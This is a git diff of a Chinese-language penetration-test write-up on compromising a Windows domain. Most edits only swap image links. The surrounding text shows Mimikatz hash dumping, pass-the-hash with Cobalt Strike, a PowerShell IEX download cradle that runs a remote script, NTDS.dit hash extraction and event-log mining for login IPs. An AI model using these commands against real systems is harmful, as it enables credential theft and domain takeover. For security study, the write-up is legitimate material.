@@ -24,11 +24,13 @@ systeminfo --> Windows Server 2008 R2 Enterprise
 
 直接`run Mimikatz` 获取到了当前主机用户的ntlm hash。
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag1.png)
 
 ## 方法
 
-使用`Cobalt Strike`的ARP扫描（因为net view使用不了），使得`Targets`有记录。
+使用`Cobalt Strike`的ARP扫描（因为net view使用不了），使得`Targets`有记录
+。
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag2.png)
 
 用比较典型的`hash传递`碰一下看看运气怎么样。
 
@@ -45,10 +47,10 @@ systeminfo --> Windows Server 2008 R2 Enterprise
 192.168.58.21 # 成功
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5cea3b182711cd2096ff5116)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag3.png)
 
 这个过程就是不断的进行`hash注入`，不断的`dump密码`，结果就如上图。看`Credentials`里是否存在域管用户账密。
-![img](https://www.yunzhijia.com/microblog/filesvr/5cea3ac59b521a11ecb7384f)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag4.png)
 
 ## 定位
 
@@ -74,10 +76,8 @@ net group "domain controllers" /domain  #查看域控制器
 BDC$                     PDC$
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5cea3aa72711cd2096ff4e6f)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag5.png)
 
-同时通过GPP组策略成功解密出域控本地administraor密码：
-![img](https://www.yunzhijia.com/microblog/filesvr/5cf13b8ddb5aa6649fc91a2b)
 
 然而发现我已经获取到了dc的账号密码。并在`CS`上上线了，这就意味的此时的域已经沦陷。
 
@@ -102,7 +102,7 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuser
 ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5cea3a81e67d0a23c65bb1e0)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag6.png)
 
 之前给自己挖了个坑，关于如何去获取域用户的登录IP，除了nmap外，可以ping域用户名，然而这是一个非常错误的认知，这种前提是UNC为系统机器名，这种情况少之又少。
 
@@ -129,7 +129,7 @@ LogParser.exe -i:EVT -o csv "SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,'|')) a
 grep -v '\$' log.txt | sort | uniq | egrep -v 'ANONYMOUS LOGON|-|:' > login_succeed.txt
 ```
 
-![img](https://www.yunzhijia.com/microblog/filesvr/5d348af332f2ca7e75b1ceee)
+![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag7.png)
 
 # 收尾
 
